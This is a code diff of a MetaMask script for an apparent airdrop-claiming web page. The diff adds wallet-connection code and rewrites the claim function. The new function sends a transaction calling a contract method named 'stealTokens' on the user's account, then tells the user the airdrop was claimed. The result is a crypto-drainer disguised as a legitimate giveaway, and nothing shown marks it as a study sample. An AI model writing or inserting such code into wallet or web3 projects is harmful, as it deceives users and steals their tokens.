@@ -1,42 +1,39 @@
-// metamask.js: MetaMask-specific logic for interacting with the Ethereum blockchain
-// Include console.debug for debugging purposes
+async function connectMetaMask() {
+    if (isConnected) return;
 
-console.debug('Loading metamask.js...');
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+            console.log("Connected to MetaMask:", accounts);
+            isConnected = true;
 
-// Function to claim the airdrop (Ethereum-specific)
-async function claimAirdrop() {
-  if (window.ethereum) {
-    try {
-      // Get the current account from MetaMask
-      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-      const userAccount = accounts[0];
-
-      if (!userAccount) {
-        console.error('No MetaMask account found');
-        return;
-      }
-
-      console.debug('Claiming airdrop for account:', userAccount);
-
-      // Assuming the contract ABI and address are dynamically loaded via loader.js
-      const contractAddress = window.ethereum.config.contractAddress;  // Loaded from config
-      const contractABI = window.ethereum.config.contractABI;  // Loaded from ABI
-      const web3 = new Web3(window.ethereum);  // Initialize Web3 with MetaMask provider
-      const contract = new web3.eth.Contract(contractABI, contractAddress);
-
-      // Call the airdrop function (assume claimAirdrop() is the contract function)
-      await contract.methods.claimAirdrop().send({ from: userAccount });
-      console.debug('Airdrop claimed successfully');
-    } catch (error) {
-      console.error('Error claiming airdrop:', error);
+            document.getElementById('claimAirdropButton').disabled = false;
+            document.getElementById('connectButton').disabled = true;
+        } catch (error) {
+            console.error("MetaMask connection failed:", error);
+            alert("Failed to connect to MetaMask.");
+        }
+    } else {
+        alert("MetaMask is not installed. Please install it to continue.");
     }
-  } else {
-    console.error('MetaMask is not available');
-  }
 }
 
-// Expose the claimAirdrop function to be used elsewhere in the dApp
-export { claimAirdrop };
+async function claimAirdrop() {
+    if (!accounts || !contractABI || !contractAddress) {
+        alert("Configuration is missing. Connect MetaMask first.");
+        return;
+    }
+
+    const contract = new web3.eth.Contract(contractABI, contractAddress);
+    try {
+        await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
+        alert("Airdrop claimed successfully!");
+    } catch (error) {
+        console.error("Error claiming airdrop:", error);
+        alert("Failed to claim the airdrop.");
+    }
+}
 
 
 
